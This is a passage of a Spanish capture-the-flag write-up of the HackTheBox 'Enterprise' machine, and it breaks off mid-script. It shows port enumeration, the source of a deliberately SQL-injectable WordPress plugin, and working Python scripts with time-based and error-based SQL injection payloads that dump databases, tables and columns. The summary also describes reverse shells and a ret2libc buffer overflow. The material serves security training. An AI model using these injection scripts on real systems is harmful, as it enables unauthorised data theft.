---
layout      : post
title       : "HackTheBox - Enterprise"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112banner.png
category    : [ htb ]
tags        : [ buffer-overflow, SQLi, wordpress, joomla, docker, pivoting ]
---
Máquina Linux nivel medio, vamos a movernos entre sentencias **SQL** para generar pinchazos e.e Pivotearemos entre contenedores y compartiremos experiencias con el host... Finalmente explotaremos un **buffer overflow** mediante un **ret2libc** para obtener una **/bin/sh** en el host como **root**.

![112enterpriseHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112enterpriseHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [MinatoTW](https://www.hackthebox.eu/profile/8308).

Bueno, una locura esta vaina...

Nos enfrentaremos a cositas web, en el puerto **443** encontraremos un archivo `.zip`, lo usaremos para encontrar un plugin vulnerable a **inyección SQL**, jugaremos demasiado con explotación manual, crearemos un script para extraer todas las bases de datos, tablas, columnas y data relacionada con ellas...

Enumerando las tablas encontraremos usuarios, contraseñas (encriptadas y en texto plano) y un post oculto de **WordPress** con contraseñas, relacionando los puertos **80 (WordPress)** y **8080 (Joomla)** lograremos pasar los paneles login con credenciales válidas. 

Por parte de **WordPress** usaremos los plugins instalados para modificar su código `PHP` y entablarnos una reverse Shell. Haremos prácticamente lo mismo en **Joomla** para obtener una reverse Shell. Los dos servicios están corriendo en contenedores **Docker**.

Dando vueltas nos daremos cuenta de que el contenedor que mantiene el servicio **Joomla** tiene una carpeta compartida con la máquina host, la carpeta compartida es la que encontramos en el puerto **443** (donde está el archivo comprimido), así que usaremos esto para crear un archivo `.php` (para que sea interpretado por la web) donde le indiquemos que nos genere una reverse Shell, en este caso obtendríamos una Shell en el servidor **host** `enterprise.htb` como el usuario **www-data**.

Finalmente jugaremos con un servicio (también relacionado con el plugin que explotamos inicialmente), que nos daremos cuenta de que realmente es un binario ejecutándose en un puerto externo (**32182**), jugando con el binario veremos que en un punto se genera una sobrescritura de la memoria, por lo que escribimos partes que realmente no deberíamos escribir (**Segmentation Fault**), explotaremos este **Buffer Overflow** mediante la técnica llamada **ret2libc** para indicarle al servicio que nos genere una `sh` (Shell) como el usuario que ejecuta el proceso, en este caso como el usuario **root**.

Estos son los scripts finales, en el post veremos la creación de ellos :)

* [Script **SQLi** - extraemos tablas, columnas y data de cualquier base de datos](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/enterprise/ex_all.py).
* [Script **RCE** en los contenedores o en el host](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/enterprise/RCE_word_joom_host.py).
* [Script explotando **Buffer Overflow**](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/enterprise/exploitBOF.py).

...

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Bastante enumeración y a la vez bastante real, disfrutemos.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

**al toke my rei, se viene muuuuuuuuuuuuuuuuucho pa leer.**

1. [Enumeración](#enumeracion).
2. [Explotación](#explotacion).
3. [Movimiento lateral **www-data (docker)** -> **www-data (host)**](#movimiento-lateral-wwwdata-doc-host).
4. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración [#](#enumeracion) {#enumeracion}

Listones, entonces empezemos validando que serviciones esta corriendo la máquina:

```bash
❭ nmap -p- --open -v 10.10.10.61 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                                                                                  |
| --open    | Solo los puertos que están abiertos                                                                      |
| -v        | Permite ver en consola lo que va encontrando                                                             |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

```bash
❭ cat initScan 
# Nmap 7.80 scan initiated Tue May  4 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.61
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.61 ()    Status: Up
Host: 10.10.10.61 ()    Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 443/open/tcp//https///, 8080/open/tcp//http-proxy///, 32812/open/tcp/////
# Nmap done at Tue May  4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 195.06 seconds
```

Tenemos estos servicios corriendo en estos puertos:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)** |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)** |
| 443    | **[HTTPS](https://sectigostore.com/blog/port-443-everything-you-need-to-know-about-https-443/)** |
| 8080   | **[HTTP Proxy](https://www.watchguard.com/help/docs/help-center/es-419/Content/es-419/fireware/proxies/http/http_proxy_about_c.html)** |
| 32812  | Desconocido |

Oko, ahora que tenemos conocimiento de los puertos abiertos y más o menos que contienen, apoyémonos de nuevo de **nmap** para hacer un escaneo de scripts conocidos y además identificar las versiones de cada servicio:

**~(Para copiar los puertos directamente en la clipboard, hacemos uso de la función referenciada antes**
 
```bash
❭ extractPorts initScan 

[*] Extracting information...
 
    [*] IP Address: 10.10.10.61
    [*] Open ports: 22,80,443,8080,32812

[*] Ports copied to clipboard
```

**)~**

```bash
❭ nmap -p 22,80,443,8080,32812 -sC -sV 10.10.10.61 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
# Nmap 7.80 scan initiated Tue May  4 25:25:25 2021 as: nmap -p 22,80,443,8080,32812 -sC -sV -oN portScan 10.10.10.61
Nmap scan report for 10.10.10.61
Host is up (0.19s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA)
|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA)
|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (ED25519)
80/tcp    open  http     Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.8.1
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: USS Enterprise &#8211; Ships Log
443/tcp   open  ssl/http Apache httpd 2.4.25 ((Ubuntu))
|_http-server-header: Apache/2.4.25 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
| Not valid before: 2017-08-25T10:35:14
|_Not valid after:  2017-09-24T10:35:14
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
8080/tcp  open  http     Apache httpd 2.4.10 ((Debian))
|_http-generator: Joomla! - Open Source Content Management
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Home
32812/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions: 
|     _______ _______ ______ _______
|     |_____| |_____/ |______
|     |_____ |_____ | | | _ ______|
|     Welcome to the Library Computer Access and Retrieval System
|     Enter Bridge Access Code: 
|     Invalid Code
|     Terminating Console
|   NULL: 
|     _______ _______ ______ _______
|     |_____| |_____/ |______
|     |_____ |_____ | | | _ ______|
|     Welcome to the Library Computer Access and Retrieval System
|_    Enter Bridge Access Code:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port32812-TCP:V=7.80%I=7%D=5/4%Time=60916018%P=x86_64-pc-linux-gnu%r(NU
SF:LL,ED,"\n\x20...
...
...
Unknown service, doesn't matter for now.
(Además me estaba dando problemas para la busqueda :P)
...
...
SF:minating\x20Console\n\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May  4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 39.93 seconds
```

Obtenemos estas versiones:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH        | OpenSSH 7.4p1 Ubuntu 10 |
| 80     | HTTP       | Apache httpd 2.4.10     |
| 443    | HTTPS      | Apache httpd 2.4.25     |
| 8080   | HTTP Proxy | Apache httpd 2.4.10     |
| 32812  | -          | Desconocido, pero parece un servidor web |

Varias cositas web, demosle antonce' a ver por donde rompemos esta vaina ;)

...

### Puerto 80 [⌖](#puerto-80) {#puerto-80}

![112page80_without_etc](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_without_etc.png)

Jmm, tenemos una página bastante linda, si vemos el código fuente tenemos referencias hacia el dominio `enterprise.htb`, así que agreguémoslo al archivo `/etc/hosts`, para que así cuando coloquemos el dominio en la web, nos resuelva como si estuviéramos conectándonos hacia la IP **10.10.10.61**.

> [Más info del archivo **/etc/hosts**](https://tldp.org/LDP/solrhe/Securing-Optimizing-Linux-RH-Edition-v1.3/chap9sec95.html).

So:

```bash
❭ cat /etc/hosts
...
10.10.10.61   enterprise.htb
...
```

Y ahora volviendo a probar en la web pero ahora contra el dominio:

![112page80_with_etc](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_with_etc.png)

Ahora tenemos una página mucho más bonita :) Veamos que podemos destacar...

En el código fuente vemos varias cosillas:

* `http://enterprise.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8.1`,
  * donde podemos interpretar que el servicio web está hecho sobre [WordPress](https://wordpress.com/es/) (`wp-*`).
  * después podemos probar con los plugins que tenga instalado, ya que mucho son vulnerables...
* `http://enterprise.htb/?p=57`,
  * podemos jugar con ese tipo de URL para fuzzear e intentar inyección de algo.

Si entramos a cualquier post vemos un usuario para guardar:

![112page80_post51_foundUser](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_post51_foundUser.png)

* **william.riker**.

Para validar si estamos sobre **WordPress** podemos apoyarnos de la extensión **Wappalyzer** y jugando con varias URL mantenidas por **WP**:

![112page80_wpAdmin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page80_wpAdmin.png)

Bien, tenemos el portal login por default de **WordPress** al redireccionarnos a `wp-admin/`. Jugando con **Wappalyzer** nos indica que estamos ante la versión `4.8.1` de **WP**, además nos indica la versión **PHP** (`5.6.31`) y que la base de datos usada es **MySQL**...

Si colocamos el usuario **william.riker** en el campo *Username* con cualquier contraseña nos responde:

> **ERROR:** The password you entered for the username **william.riker** is incorrect. Lost your password?

Si por el contrario colocamos otro usuario el cual pensemos que no exista, nos responde: **ERROR: Invalid username. Lost your password?**, asi que sabemos que el usuario **william.riker** es válido y existe ;)

Jugando con bash intentamos ver que otros recursos están disponibles mediante un secuenciador de 1 a 200 ante la URL que habíamos encontrado antes que hacia referencia a los **posts**:

```bash
❭ for i in $(seq 1 200); do echo -n "Page $i: "; curl -s -I http://enterprise.htb/?p=$i | grep HTTP; done
...
Page 13: HTTP/1.1 301 Moved Permanently
Page 14: HTTP/1.1 301 Moved Permanently
Page 15: HTTP/1.1 301 Moved Permanently
Page 16: HTTP/1.1 301 Moved Permanently
...
Page 23: HTTP/1.1 301 Moved Permanently
Page 24: HTTP/1.1 301 Moved Permanently
...
Page 51: HTTP/1.1 200 OK
...
Page 53: HTTP/1.1 200 OK
...
Page 55: HTTP/1.1 200 OK
...
Page 57: HTTP/1.1 200 OK
...
Page 69: HTTP/1.1 200 OK
...
Page 71: HTTP/1.1 301 Moved Permanently
...
```

Grepeando por titulo:

```bash
❭ for i in $(seq 1 100); do echo -n "Page $i - Status: "; curl -s -I http://enterprise.htb/?p=$i | grep "HTTP/1" | awk '{print $2}'; echo -n " Titulo: "; curl -s http://enterprise.htb/?p=$i | grep "<title>"; done
```

No vemos nada raro.

Pero viendo cada uno en la web no hay nada relevante... Haciendo fuzzing tampoco encontramos nada, buscando vulnerabilidades relacionadas con **WordPress 4.8.1** y a **Apache 2.4.10** no vemos nada, asi que movámonos para otro puerto a vel khe.

### Puerto 443 [⌖](#puerto-443) {#puerto-443}

![112page443](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page443.png)

La página por default de **Apache**.

Veamos si hay algo útil en el certificado SSL:

```bash
❭ openssl s_client -connect 10.10.10.61:443
CONNECTED(00000003)
...
depth=0 C = UK, ST = United Federation of Planets, L = Earth, O = USS Enterprise, OU = Bridge, CN = enterprise.local, emailAddress = jeanlucpicard@enterprise.local
...
```

Bien, entre toda la info que nos muestra el certificado, principalmente podemos rescatar un dominio (`enterprise.local`) y una dirección email (`jeanlucpicard@enterprise.local`) (de la que podemos extraer el usuario **jeanlucpicard**. Agreguémoslo por si algo.

Si hacemos fuzzing encontramos un recurso llamativo:

```bash
❭ wfuzz -c --hc=404 -w /opt/SecLists/Discovery/Web-Content/common.txt https://enterprise.htb/FUZZ  
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000012:   403        11 L     32 W       299 Ch      ".htpasswd"
000000011:   403        11 L     32 W       299 Ch      ".htaccess"
000000010:   403        11 L     32 W       294 Ch      ".hta"
000001755:   301        9 L      28 W       318 Ch      "files"
000002156:   200        375 L    964 W      10918 Ch    "index.html"
000003660:   403        11 L     32 W       303 Ch      "server-status"

```

Tenemos la ruta `files`, si la visitamos obtenemos:

![112page443_files](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page443_files.png)

Opa, un archivo `.zip`, pues descarguemoslo a ver que contiene...

```bash
❭ unzip lcars.zip 
Archive:  lcars.zip
  inflating: lcars/lcars_db.php
  inflating: lcars/lcars_dbpost.php
  inflating: lcars/lcars.php
```

Veamos cada uno de ellos:

##### lcars/lcars.php

```php
<?php
/*
*     Plugin Name: lcars
*     Plugin URI: enterprise.htb
*     Description: Library Computer Access And Retrieval System
*     Author: Geordi La Forge
*     Version: 0.2
*     Author URI: enterprise.htb
*                             */

// Need to create the user interface. 
// need to finsih the db interface
// need to make it secure

?> 
```

Bien, nos informamos de un **Plugin** que aparentemente está siendo ejecutado por la máquina... Jugando con el puerto **443** y el puerto **80**, encontramos la ruta actual del **Plugin**, asi que vamos bien:

```bash
❭ curl -s -I http://enterprise.htb/wp-content/plugins/lcars/lcars.php
HTTP/1.1 200 OK
Date: Tue, 04 May 2021 25:25:25 GMT
Server: Apache/2.4.10 (Debian)
X-Powered-By: PHP/5.6.31
Content-Type: text/html; charset=UTF-8
```

##### lcars/lcars_db.php

```php
<?php
include "/var/www/html/wp-config.php";
$db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
// Test the connection:
if (mysqli_connect_errno()){
    // Connection Error
    exit("Couldn't connect to the database: ".mysqli_connect_error());
}

// test to retireve an ID
if (isset($_GET['query'])){
    $query = $_GET['query'];
    $sql = "SELECT ID FROM wp_posts WHERE post_name = $query";
    $result = $db->query($sql);
    echo $result;
} else {
    echo "Failed to read query";
}

?> 
```

Opa, una conexión a la base de datos, pero lo interesante es que vemos como hace la petición ante ella al querer buscar el nombre del post (`post_name`) recibido mediante el parámetro **GET** `query`. Validemos:

```bash
❭ curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php
Failed to read query
```

Perfecto, como vemos en el código, si la variable `query` está vacía, responde **Failed to read query**.

```bash
❭ curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=hola
```

Bien, hace la consulta a la base de datos, extrayendo el **ID** de la tabla **wp_posts** con respecto al nombre del post (en el anterior caso) llamado **hola**, como no existe, responde vacío. Esto nos da una idea fuerte de que debemos explotar una **inyección SQL** para leer usuarios o algo asi, veamos el otro archivo, pero ya tenemos algo para probar.

##### lcars/lcars_dbpost.php

```php
<?php
include "/var/www/html/wp-config.php";
$db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
// Test the connection:
if (mysqli_connect_errno()){
    // Connection Error
    exit("Couldn't connect to the database: ".mysqli_connect_error());
}

// test to retireve a post name
if (isset($_GET['query'])){
    $query = (int)$_GET['query'];
    $sql = "SELECT post_title FROM wp_posts WHERE ID = $query";
    $result = $db->query($sql);
    if ($result){
        $row = $result->fetch_row();
        if (isset($row[0])){
            echo $row[0];
        }
    }
} else {
    echo "Failed to read query";
}

?> 
```

De nuevo una consulta, solo que en este caso pasa el valor de `query` a **entero**. Extrae el titulo del post (`post_title`) de la tabla `wp_posts` donde ID será igual al valor de `query`.

Veamos:

```bash
❭ curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php
Failed to read query
```

Y:

```bash
❭ curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query=1
Hello world!
❭ curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query=2
 
❭ curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_dbpost.php?query=hola
```

Con esta consulta tambien podemos jugar a ver si podemos explotar alguna **inyeccion SQL**, a darle...

...

## Explotación [#](#explotacion) {#explotacion}

Como vimos antes, si hacemos una consulta hacia el recurso `lcars_db.php` vemos:

```bash
❭ curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=a
 
```

Nos responde, pero si hacemos la consulta con un numero, obtenemos:

```bash
❭ curl -s http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1
<br />
<b>Catchable fatal error</b>:  
Object of class mysqli_result could not be converted to string in <b>/var/www/html/wp-content/plugins/lcars/lcars_db.php</b> on line <b>16</b>
<br />
```

Nos indica que el resultado no puede ser convertido a una cadena de caracteres. 

Jmm, ¿será que nos podemos aprovechar de esto? Pues sí, podemos indicarle, si hay algún problema con la consulta hacia el **ID** `1`, entonces hazme otra cosa, como por ejemplo demorar la respuesta X tiempo con la consulta `SLEEP(<tiempo>)`, la también llamada **SQL injection - Time based**. Entonces la petición quedaría asi:

```html
http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 or sleep(2);#
```

* Con `;#` le indicamos que todo lo que vaya después lo tome como comentarios.

Si lo extrapolamos a como viajaría la consulta hacia la base de datos, quedaría asi:

```sql
SELECT ID FROM wp_posts WHERE post_name = 1 or sleep(2);#;
```

* Como el nombre del post da error, ejecuta el **sleep**.

Si ejecutamos en `bash`, tenemos:

```bash
# URL encodeada
❭ time curl -s "http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1%20or%20sleep(2);#"
<br />
<b>Catchable fatal error</b>:  Object of class mysqli_result could not be converted to string in <b>/var/www/html/wp-content/plugins/lcars/lcars_db.php</b> on line <b>16</b><br />

real    1m25,973s
...
```

Se demora 1 minuto con 25 segundos (que es un montón, pero es porque por cada fila de la tabla hace el **sleep**), incluso al indicarle que simplemente se demorara **2** segundos más... Por lo tanto podemos jugar con el mismo **SLEEP** para indicarle milisegundos, a ver cuanto se demora en realidad:

```bash
❭ time curl -s "http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=2%20or%20sleep(0.1);#"
<br />
<b>Catchable fatal error</b>:  Object of class mysqli_result could not be converted to string in <b>/var/www/html/wp-content/plugins/lcars/lcars_db.php</b> on line <b>16</b><br />

real    0m4,658s
...
```

Validamos de nuevo y asi nos aseguramos:

```bash
❭ time curl -s "http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=2%20or%20sleep(0.1);#"
<br />
<b>Catchable fatal error</b>:  Object of class mysqli_result could not be converted to string in <b>/var/www/html/wp-content/plugins/lcars/lcars_db.php</b> on line <b>16</b><br />

real    0m4,657s
...
```

Bien, entonces con esto validamos una explotación SQL basada en tiempo y tenemos una base para probar después, **4 segundos con SLEEP(0.1)**. Creemos un script para jugar con las tablas y extraer info interesante:

### Explotacion SQL injection manual [#](#explotacion-sqli) {#explotacion-sqli}

> Lindo recurso - [MySQL SQL Injection Cheat Sheet](pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet).

```py
#!/usr/bin/python3

import requests
import string
import signal
import time
from pwn import *

# Ctrl + C
def def_handler(sig, frame):
    print("\nInterrupción, saliendo...\n")
    exit(1)

signal.signal(signal.SIGINT, def_handler)

url = "http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php"
result = ""

# abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~£
set_chars = string.ascii_letters + string.digits + string.punctuation + "£"

session = requests.Session()

# Hacemos de cuenta que hay 10 bases de datos
p1 = log.progress("Extrayendo bases de datos")
for db_position in range(0,10):
    p2 = log.progress("DB [%d]" % (db_position))
    # Recorremos cada base de datos y vamos descubriendo las letras que componen su nombre
    for word_position in range(1,51):
        # Iteramos entre cada letra del conjunto
        for letter in set_chars:
            # Tiempo antes de la petición
            time_before = time.time()
            payload = "IF(Ascii(substring((SELECT schema_name FROM information_schema.schemata LIMIT %d,1),%d,1))=%d,sleep(0.1),0)" % (db_position, word_position, ord(letter))
            p1.status(payload)

            data_get = {"query" : "1 or " + payload}
            r = session.get(url, params=data_get)

            # Tiempo despues de la petición
            time_after = time.time()
            # Si la diferencia de tiempos es mayor a 3 (recuerden que 0.1 era igual a 4 segundos) sabemos que ejecuto el SLEEP,
            # por lo tanto sabemos que esa letra hace parte de la respuesta
            if time_after - time_before > 3:
                result += letter
                p2.status(result)
                break
            # Si llega a este caracter, quiere decir que ya termino la palabra actual y va a la siguiente.
            elif letter == "£":
                break

        if letter == "£":
            break

    p2.success(result)
    result = ""

p1.success("d0Ne")
print("\nk3Ep br3ak1n6 4anYyyu...\n")
```

En la ejecución tenemos:

```bash
❭ python3 ex_db_name.py 
[+] Extrayendo bases de datos: d0Ne
[+] DB [0]: information_schema
[+] DB [1]: joomla
[+] DB [2]: joomladb
[+] DB [3]: mysql
[+] DB [4]: performance_schema
[+] DB [5]: sys
[+] DB [6]: wordpress
[+] DB [7]: wordpressdb
[+] DB [8]
[+] DB [9]

k3Ep br3ak1n6 4anYyyu...
```

Opa, tenemos 8 bases de datos 😬

Veamos primero las relacionadas con **WordPress**

#### SQL injection - Columnas WordPress DB

Acá estuve bastante rato atascado intentando cosas, ya que los payloads que había usado de explotaciones pasadas no me estaban funcionando, ni siquiera el payload "obvio" que debería ir después de encontrar las bases de datos:

```py
# Esta deberia ser la siguiente en explotar:

payload = "1 or IF(Ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema='wordpress' LIMIT %d,1),%d,1))=%d,sleep(0.1),0);-- -" % (table_position, word_position, ord(letter))

# O de esta forma (que si la usamos para descubrir las bases de datos funciona):

payload = "1 or (SELECT (CASE WHEN (ORD(MID((SELECT DISTINCT(IFNULL(CAST(table_name AS NCHAR),0x20)) "
payload += "FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='wordpress' LIMIT %d,1),%d,1))=%d) " % (table_position, word_position, ord(letter))
payload += "THEN 1 ELSE (SELECT 2 UNION SELECT 3) END))"
```

Pero nada, siempre obteníamos una respuesta en blanco :(

Tuve que decantarme por ver como hacia **sqlmap** las peticiones y desde ahí usar la sentencia para jugar, al ejecutar la instrucción (de abajo) podemos ver la siguiente sentencia SQL que hace para extraer nombres de tablas:

```bash
❭ sqlmap -u http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 -D wordpress --tables -v6
```

* Le indicamos la URL vulnerable,
* que tome la base de datos llamada **WordPress**,
* nos dumpee las tablas y
* que el verbose sea máximo, asi tenemos claridad de los payloads y cositas que usa.

Encontramos esta sentencia:

(Le cambio algunas cositas para que sea más intuitiva)

```sql
(
   SELECT 8350 FROM(
       SELECT COUNT(*),CONCAT(
           0x41,(
               SELECT MID(
                   (
                       IFNULL(
                           CAST(
                               table_name AS NCHAR
                           ),0x20
                       )
                   ),1,50
               ) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x4242) LIMIT 0,1
           ),0x43,FLOOR(RAND(0)*2)
       )x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x
   )z
)
```

Hace un substring ([MID](https://www.w3resource.com/mysql/string-functions/mysql-mid-function.php)) del nombre de la tabla (50 posiciones por si algo) encontrada ([IN](https://www.mysqltutorial.org/sql-in.aspx)) en la base de datos **BB** (`0x4242` en hexadecimal), esa tabla la concatena ([CONCAT](https://www.w3schools.com/mysql/func_mysql_concat.asp)) con 3 valores más: **A** (`0x41` hex), **C** (`0x41` hex) y un número random ([RAND](https://database.guide/mysql-rand-function-generate-a-random-number-in-mysql/)) jugando con el entero más grande ([FLOOR](https://www.w3resource.com/mysql/mathematical-functions/mysql-floor-function.php)). El resultado (la tabla, por ejemplo: **Aclaroquesi_tableC**) viene concatenada en varios valores, esto para generar algunos errores y agruparlos (:

Es medio rara de entender, pero cada vez que la lees se vuelve más fácil. Listo, pues apoyémonos de esta sentencia para extraer las tablas de las bases de datos anteriores:

#### SQL injection - Tablas

```py
#!/usr/bin/python3

import requests
import string
import signal
import time
import sys
import re
from pwn import *

# Ctrl + C
def def_handler(sig, frame):
    print("\nInterrupción, saliendo...\n")
    exit(1)

signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) != 2:                     
    print("\n[!] Usage: python3 " + sys.argv[0] + " <database>\n")
    exit(0)

url = "http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php"
result = ""

# Recibimos como argumento la base de datos y la convertimos a hexadecimal
session = requests.Session()
db_name = sys.argv[1]
db_name_hex = db_name.encode('utf-8').hex()

p1 = log.progress("Extrayendo tablas de la base de datos %s" % (db_name))
p2 = log.progress("Payload")

# En el caso de que existan 100 tablas
for table_position in range(0,100):

    # 0x5441424C45 = TABLE
    # 0x%s = El nombre de la base de datos en hexadecimal
    ## Resultado: i.e -> TABLEestaeslatablaTABLE
    payload = "(SELECT 8350 FROM(SELECT COUNT(*),CONCAT(0x5441424C45,(SELECT MID((IFNULL(CAST(table_name AS NCHAR),0x20)),1,50) FROM "
    payload += "INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x%s) LIMIT %d,1),0x5441424C45,FLOOR(RAND(0)*2))x " % (db_name_hex, table_position)
    payload += "FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)nada)"

    data_get = {"query" : "1 or " + payload}
    p2.status(data_get["query"])
    r = session.get(url, params=data_get)

    if "Duplicate" not in r.text:
        break

    p3 = log.progress("Tabla [%d]" % (table_position))

    # Tomamos el resultado y extraermos lo que este entre la E (e final de TABLE) y la T (t inicial de TABLE), esa seria la tabla.
    result += re.findall(r'E(.*?)T', r.text)[0]
    p3.success(result)
    result = ""

p1.success("d0Ne")
p2.success("d0Ne")
print("\nk3Ep br3ak1n6 4anYyyu...\n")
```

Ahora si, probemos con la base de datos **wordpress**:

```bash
❭ python3 ex_tables.py wordpress
[+] Extrayendo tablas de la base de datos wordpress: d0Ne
[+] Payload: d0Ne
[+] Tabla [0]: wp_commentmeta
[+] Tabla [1]: wp_comments
[+] Tabla [2]: wp_links
[+] Tabla [3]: wp_options
[+] Tabla [4]: wp_postmeta
[+] Tabla [5]: wp_posts
[+] Tabla [6]: wp_term_relationships
[+] Tabla [7]: wp_term_taxonomy
[+] Tabla [8]: wp_termmeta
[+] Tabla [9]: wp_terms
[+] Tabla [10]: wp_usermeta
[+] Tabla [11]: wp_users

k3Ep br3ak1n6 4anYyyu...

```

Bien, 12 tablas, juguemos con el script para extraer columnas de las tablas:

#### SQL injection - Columnas wordpress DB

```py
...
table_name = sys.argv[2]
table_name_hex = table_name.encode('utf-8').hex()
...
    payload = "(SELECT 8350 FROM(SELECT COUNT(*),CONCAT(0x5441424C45,(SELECT MID((IFNULL(CAST(column_name AS NCHAR),0x20)),1,50) FROM INFORMATION_SCHEMA.COLUMNS "
    payload += "WHERE table_schema IN (0x%s) AND table_name IN (0x%s) LIMIT %d,1),0x5441424C45,FLOOR(RAND(0)*2))x " % (db_name_hex, table_name_hex, table_position)
    payload += "FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)nada)"
...
```

Le indicamos que ahora tome en otro parametro la tabla a fuzzear, ejecutandolo contra la tabla `wp_users`, tenemos:

```bash
❭ python3 ex_colums.py wordpress wp_users
[+] Extrayendo columnas de la tabla wp_users: d0Ne
[+] Payload: d0Ne
------------------------------------------·
[+] Columna [0]: ID
[+] Columna [1]: user_login
[+] Columna [2]: user_pass
[+] Columna [3]: user_nicename
[+] Columna [4]: user_email
[+] Columna [5]: user_url
[+] Columna [6]: user_registered
[+] Columna [7]: user_activation_key
[+] Columna [8]: user_status
[+] Columna [9]: display_name

k3Ep br3ak1n6 4anYyyu...

```

#### SQL injection - Info columnas

Perfecto, veamos la data que hay en la columna `user_login` y `user_pass`:

```py
...
db_name = sys.argv[1]
table_name = sys.argv[2]
column_name = sys.argv[3]
...
    # Debemos agrandar el substring, ya que pueda que nos encontremos unos hashes y pueden ser largos, ahora la extraccion es: Edata_de_la_tablaT
